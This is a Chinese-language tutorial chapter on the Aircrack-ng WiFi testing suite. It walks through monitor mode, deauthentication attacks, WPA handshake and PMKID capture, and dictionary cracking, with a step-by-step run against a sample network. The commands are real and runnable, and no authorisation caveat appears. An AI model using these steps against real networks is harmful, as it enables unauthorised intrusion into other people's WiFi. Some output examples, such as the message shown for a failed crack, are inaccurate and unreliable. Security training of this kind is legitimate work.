# 第十六章：Aircrack-ng - WiFi安全测试套件

## 16.1 Aircrack-ng 简介

### 什么是 Aircrack-ng？

想象你是一名侦探，需要找出某个无线网络的密码。**Aircrack-ng**就是一套完整的WiFi安全测试工具。

**Aircrack-ng套件**包含：
- 监听WiFi流量
- 捕获握手包
- 破解WiFi密码
- 创建虚假热点

简单来说，Aircrack-ng是**WiFi安全测试的必备工具**。

### 套件组件

| 工具 | 功能 |
|------|------|
| Airmon-ng | 启用监听模式 |
| Airodump-ng | 捕获WiFi数据包 |
| Aireplay-ng | 发送攻击数据包 |
| Aircrack-ng | 破解WiFi密码 |
| Airbase-ng | 创建虚假AP |

---

## 16.2 无线网卡准备

### 网卡要求

| 要求 | 说明 |
|------|------|
| 支持监听模式 | 能捕获WiFi数据包 |
| 支持注入模式 | 能发送数据包 |
| 兼容Linux | 多数网卡兼容 |

### 推荐网卡

| 网卡 | 说明 |
|------|------|
| Alfa AWUS036NHA | 经典Atheros芯片 |
| Alfa AWUS036ACM | AC双频网卡 |
| TP-LINK TL-WN722N | 低成本选择 |

---

## 16.3 Linux 系统安装教程

### Kali Linux（预装）

Kali预装Aircrack-ng：
```bash
aircrack-ng --help
```

### Ubuntu/Debian 安装

```bash
sudo apt install aircrack-ng
```

### 验证安装

```bash
aircrack-ng --version
```

---

## 16.4 启用监听模式详解

### 什么是监听模式？

监听模式让网卡能捕获所有WiFi数据包，而不仅仅是自己连接的网络。

### 启用监听模式

**步骤1：停止干扰服务**
```bash
sudo airmon-ng check kill
```

**步骤2：启用监听模式**
```bash
sudo airmon-ng start wlan0
```

**步骤3：验证监听模式**
```bash
iwconfig
```

网卡名变为`wlan0mon`，说明监听模式启用成功。

### 关闭监听模式

```bash
sudo airmon-ng stop wlan0mon
```

---

## 16.5 Airodump-ng 使用详解

### 扫描WiFi网络

```bash
sudo airodump-ng wlan0mon
```

### 输出解析

| 列 | 说明 |
|------|------|
| BSSID | AP的MAC地址 |
| PWR | 信号强度 |
| Beacons | 信标帧数量 |
| #Data | 数据帧数量 |
| CH | 信道号 |
| ENC | 加密方式 |
| ESSID | 网络名称 |

### 指定信道扫描

```bash
sudo airodump-ng wlan0mon -c 6
```

### 保存数据包

```bash
sudo airodump-ng wlan0mon -w output
```

保存为`output-01.cap`等文件。

---

## 16.6 捕获握手包详解

### 什么是握手包？

握手包是WiFi连接过程中的加密数据，包含密码的哈希。

### 捕获握手包

**步骤1：扫描目标**
```bash
sudo airodump-ng wlan0mon
```

找到目标网络的BSSID和信道。

**步骤2：监听目标**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**步骤3：等待握手**

等待有客户端连接，或使用aireplay-ng加速。

### 加速捕获

发送去认证包，让客户端重新连接：
```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

参数说明：
- `-0`：去认证攻击
- `5`：发送5次
- `-a`：目标AP的BSSID

### 确认握手

Airodump-ng右上角显示：
```
[ WPA handshake: AA:BB:CC:DD:EE:FF
```

---

## 16.7 破解WiFi密码详解

### 准备字典

使用密码字典破解：
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### 破解结果

```
                               Aircrack-ng 1.6

      [00:00:00] 1000 keys tested (100.00 k/s)

                           KEY FOUND! [ password123 ]


      Master Key     : A1 B2 C3 ...
      Transient Key  : ...
      EAPOL HMAC     : ...
```

### 破解失败

如果字典中没有正确密码：
```
Quitting... No valid handshake found.
```

需要使用更大的字典或创建自定义字典。

---

## 16.8 PMKID攻击详解

### 什么是PMKID？

PMKID是某些路由器在连接前发送的哈希，可以用来破解密码。

### 捕获PMKID

```bash
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w pmkid
```

### 使用hcxpcapngtool提取

```bash
hcxpcapngtool -o pmkid.hash pmkid-01.cap
```

### 破解PMKID

```bash
hashcat -m 22000 pmkid.hash /usr/share/wordlists/rockyou.txt
```

---

## 16.9 实战案例：WPA2破解

### 场景说明

目标WiFi：`TargetWiFi`，信道6。

### 步骤

**步骤1：启用监听**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

**步骤2：扫描目标**
```bash
sudo airodump-ng wlan0mon
```

找到BSSID：`AA:BB:CC:DD:EE:FF`

**步骤3：监听目标**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon
```

**步骤4：发送去认证**
```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**步骤5：破解密码**
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt target-01.cap
```

---

## 总结

本章介绍了Aircrack-ng的使用：

1. **安装配置**：Linux安装、网卡准备
2. **监听模式**：启用和关闭
3. **Airodump-ng**：扫描和捕获
4. **握手包捕获**：等待和加速
5. **密码破解**：字典破解
6. **PMKID攻击**：新式攻击方法
7. **实战案例**：完整破解流程

Aircrack-ng是WiFi安全测试的核心工具。

下一章我们将学习Masscan——高速端口扫描器！